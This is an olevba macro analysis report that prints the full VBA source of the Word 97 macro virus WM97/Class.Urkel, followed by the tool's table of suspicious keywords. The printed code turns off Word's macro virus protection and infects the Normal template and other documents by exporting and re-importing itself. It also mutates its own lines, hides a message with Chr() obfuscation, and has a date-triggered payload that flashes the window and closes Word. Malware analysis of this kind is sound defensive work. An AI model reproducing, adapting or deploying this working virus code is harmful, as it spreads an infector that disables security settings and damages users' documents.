olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Class.u-a14b0cb479509db4054f374ea443aa65473061fc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Class.u-a14b0cb479509db4054f374ea443aa65473061fc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoOpen()
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
On Error GoTo 75
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
I = 0
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
Options.VirusProtection = False
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
Options.SaveNormalPrompt = False
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
Options.ConfirmConversions = False
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
If Day(13) And Month(11) Then Call AutoCrazy
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
ux = ActiveDocument.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
xu = NormalTemplate.VBProject.VBComponents.Item(1).codemodule.CountOfLines
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
If xu > 94 And ux > 0 Then GoTo 75
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
If xu < 94 Then
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 Set bg = NormalTemplate.VBProject.VBComponents.Item(1)
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 ActiveDocument.VBProject.VBComponents.Item(1).Name = bg.Name
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 ActiveDocument.VBProject.VBComponents.Item(1).Export "c:\urkel.sys"
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
End If
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
If ux = 0 Then Set bg = ActiveDocument.VBProject.VBComponents.Item(1)
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 Infection = Int(Rnd * 50)
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 If Infection = 49 Then MsgBox Chr(32) + Chr(32) + Chr(32) + Chr(32) + Chr(85) + Chr(82) + Chr(75) + Chr(69) + Chr(76) + Chr(32) + Chr(66) + Chr(121) + Chr(32) + Chr(86) + Chr(105) + Chr(82) + Chr(117) + Chr(83)
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 bg.codemodule.AddFromFile ("c:\urkel.sys")
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 With bg.codemodule
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
    For x = 1 To 4
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
    .deletelines 1
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
    Next x
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 End With
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 If xu < 94 Then
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
    With bg.codemodule
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
    .replaceline 1, "Sub AutoClose()"
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
    .replaceline 99, "Sub ToolsMacro()"
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
    rd = Int(Rnd * 100)
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
If rd = 99 Then .replaceline 69, ".replaceline x, ""'"" & Application.Version & Application.MathCoprocessorAvailable & Application.FocusInMailHeader & Application.ActiveWindow"
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
End With
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 End If
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 With bg.codemodule
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
    For x = 2 To 96 Step 2
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
    .replaceline x, "'" & Application.DisplayRecentFiles & Application.StartupPath & Application.ActiveDocument & Application.ActiveWindow
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
    Next x
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 End With
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
75:
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
 If xu > 94 And ux = 0 Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
End Sub
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
Private Sub AutoCrazy()
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
Top:
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
I = I + 1
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
On Error Resume Next
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
Application.WindowState = wdWindowStateMinimize
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
Application.WindowState = wdWindowStateMaximize
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
If I < 10 Then GoTo Top
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
Application.Quit
'Truec:\program files\microsoft office\office\startupDocvir3.docDocvir3.doc
End Sub

Sub ViewVBCode()
'WM97/Class.Urkel by Virus, HI Vic.
End Sub





+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|codemodule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
+----------+--------------------+---------------------------------------------+

